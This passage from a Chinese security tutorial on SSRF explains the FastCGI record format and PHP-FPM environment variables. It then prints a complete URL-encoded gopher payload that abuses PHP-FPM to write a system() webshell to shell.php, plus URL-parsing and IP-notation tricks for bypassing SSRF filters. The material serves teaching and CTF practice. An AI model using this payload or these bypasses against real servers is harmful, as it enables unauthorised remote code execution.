  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小
  unsigned char reserved; 
 
  &#x2F;* Body *&#x2F;
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
&#125; FCGI_Record;</code></pre>

<p>语言端解析了FastCGI头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p>
<p><code>requestId</code>作为同一次请求的id。</p>
<p><code>type</code>就是指定该Record的作用。因为FastCGI一个Record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个Record。通过<code>type</code>来标志每个Record的作用，主要有以下几个类型：</p>
<img src="/2022/08/14/ssrf/image-20220815005106290.png" class="" loading="lazy">

<p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对。</p>
<ul>
<li><strong>PHP-FPM</strong>（PHP FastCGI Process Manager）其实是一个fastcgi协议解析器，按照FastCGI的协议将TCP流解析成真正的数据。</li>
</ul>
<p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
<pre class="language-none"><code class="language-none">&#123;
    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,
    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,
    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,
    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,
    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,
    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
    &#39;SERVER_PORT&#39;: &#39;80&#39;,
    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;
&#125;</code></pre>

<p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
<p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p>
<img src="/2022/08/14/ssrf/image-20220814210302688.png" class="" loading="lazy">



<p>PHP-FPM默认监听的端口是9000，一般情况会只会接受127.0.0.1也就是本地的请求，利用SSRF可以越权访问。</p>
<p>利用FastCGI修改环境变量<code>auto_prepend_file = php://input</code>和<code>allow_url_include = On</code>，就会在执行php脚本之前包含<code>auto_prepend_file</code>文件的内容，<code>php://input</code>也就是POST的内容，这样我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了<code>php-fpm</code>任意代码执行的攻击。</p>
<p>那么只要目标服务器上存在可访问的php文件即可RCE。</p>
<ul>
<li>测试</li>
</ul>
<p>已知存在<code>/var/html/www/index.php</code>，准备一句话木马<code>&lt;?php system($_GET[&#39;shell&#39;]);?&gt;</code>。</p>
<p>利用**<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>**生成payload：</p>
<img src="/2022/08/14/ssrf/image-20220815190325204.png" class="" loading="lazy">

<p>再次url编码，因为GET传值和CURL都会解码一次：</p>
<pre class="language-none"><code class="language-none">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH127%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%257F%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520%2522PD9waHAgc3lzdGVtKCRfR0VUWydzaGVsbCddKTs%2FPg%253D%253D%2522%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre>

<p>成功写入<code>shell.php</code>：</p>
<img src="/2022/08/14/ssrf/image-20220815190507325.png" class="" loading="lazy">

<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>一些常见的限制和绕过姿势。</p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
<p>例如限制路径必须含有<code>http://www.baidu.com</code>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http://www.baidu.com'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// http://www.baidu.com@192.168.0.1</span></code></pre>

<p>对上述URL的内容进行解析的时候，很可能会认为访问URL的host为<code>www.baidu.com</code>，而实际上这个URL所请求的内容为<code>192.168.0.1</code>上的内容。</p>
<h3 id="数字IP"><a href="#数字IP" class="headerlink" title="数字IP"></a>数字IP</h3><p>一些后端对传过来的URL参数进行正则匹配来过滤掉内网IP，对于这种过滤，可以改变IP的形式来绕过。</p>
<p>例如：十六进制、八进制、十进制、省略模式</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/web/265646.html">SSRF的利用方式</a></p>
<p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
      </tags>
  </entry>
</search>
